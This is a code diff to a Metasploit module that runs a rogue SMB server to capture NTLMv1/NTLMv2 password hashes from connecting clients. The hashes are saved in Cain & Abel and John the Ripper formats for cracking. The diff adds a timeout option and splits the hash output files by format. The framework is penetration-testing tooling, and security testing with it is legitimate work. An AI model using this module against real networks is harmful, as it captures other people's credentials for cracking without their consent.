@@ -14,9 +14,9 @@ class MetasploitModule < Msf::Auxiliary
     super({
       'Name' => 'Authentication Capture: SMB',
       'Description' => %q{
-        This module provides a SMB service that can be used to capture the
-        challenge-response password hashes of SMB client systems. Responses
-        sent by this service have by default a random 8 byte challenge string
+        This module provides a SMB service that can be used to capture the challenge-response
+        password NTLMv1 & NTLMv2 hashes used with SMB1, SMB2, or SMB3 client systems.
+        Responses sent by this service have by default a random 8 byte challenge string
         of format `\x11\x22\x33\x44\x55\x66\x77\x88`, allowing for easy cracking using
         Cain & Abel (NTLMv1) or John the ripper (with jumbo patch).
 
@@ -45,10 +45,11 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('CAINPWFILE', [ false, 'The local filename to store Cain&Abel format hashes in. Only supports NTLMv1 hashes.', nil ]),
-        OptString.new('JOHNPWFILE', [ false, 'The local filename to store JTR format hashes in.', nil ]),
+        OptString.new('CAINPWFILE', [ false, 'Name of file to store Cain&Abel hashes in. Only supports NTLMv1 hashes. Can be a path.', nil ]),
+        OptString.new('JOHNPWFILE', [ false, 'Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 hashes, each of which is stored in separate files. Can also be a path.', nil ]),
         OptString.new('CHALLENGE', [ false, 'The 8 byte server challenge. If unset or not a valid 16 character hexadecimal pattern, a random challenge is used instead.' ]),
-        OptString.new('DOMAIN_NAME', [ true, 'The domain name used during smb exchange.', 'anonymous' ])
+        OptString.new('DOMAIN_NAME', [ true, 'The domain name used during SMB exchange.', 'anonymous' ]),
+        OptInt.new('TIMEOUT', [ true, 'Seconds that the server socket will wait for a response after the client has initiated communication.', 5])
       ]
     )
 
@@ -169,13 +170,9 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if datastore['JOHNPWFILE']
-      # JTR NTLM hash format NTLMv1
-      # Username::Domain:LMHash:NTHash:Challenge
-      #
-      # JTR NTLM hash format NTLMv2
-      # Username::Domain:Challenge:NTHash[0...16]:NTHash[16...-1]
+      path = build_jtr_file_name(creds[:jtr_format])
 
-      File.open(File.expand_path(datastore['JOHNPWFILE'], Msf::Config.install_root), 'ab') do |f|
+      File.open(path, 'ab') do |f|
         f.puts(creds[:combined_hash])
       end
     end
@@ -195,7 +192,7 @@ class MetasploitModule < Msf::Auxiliary
       'LocalHost' => datastore['SRVHOST'],
       'LocalPort' => datastore['SRVPORT'],
       'Server' => true,
-      'Timeout' => 3,
+      'Timeout' => datastore['TIMEOUT'],
       'Context' =>
         {
           'Msf' => framework,
@@ -225,11 +222,15 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if datastore['JOHNPWFILE']
-      print_status("JTR hashes will be stored at #{File.expand_path(datastore['JOHNPWFILE'], Msf::Config.install_root)}")
+      print_status("JTR hashes will be split into two files depending on the hash format.")
+      print_status("#{build_jtr_file_name('netntlm')} for NTLMv1 hashes.")
+      print_status("#{build_jtr_file_name('netntlmv2')} for NTLMv2 hashes.")
+      print_line
     end
 
     if datastore['CAINPWFILE']
       print_status("Cain & Abel hashes will be stored at #{File.expand_path(datastore['CAINPWFILE'], Msf::Config.install_root)}")
+      print_line
     end
 
     server = RubySMB::Server.new(
@@ -254,5 +255,27 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     super
+  end
+
+  def build_jtr_file_name(jtr_format)
+    # JTR NTLM hash format NTLMv1
+    # Username::Domain:LMHash:NTHash:Challenge
+    #
+    # JTR NTLM hash format NTLMv2
+    # Username::Domain:Challenge:NTHash[0...16]:NTHash[16...-1]
+
+    path = File.expand_path(datastore['JOHNPWFILE'], Msf::Config.install_root)
+
+    # if the passed file name does not contain an extension
+    if File.extname(File.basename(path)).empty?
+      path += "_#{jtr_format}"
+    else
+      path_parts = path.split('.')
+
+      # inserts _jtr_format between the last extension and the rest of the path
+      path = "#{path_parts[0...-1].join('.')}_#{jtr_format}.#{path_parts[-1]}"
+    end
+
+    path
   end
 end
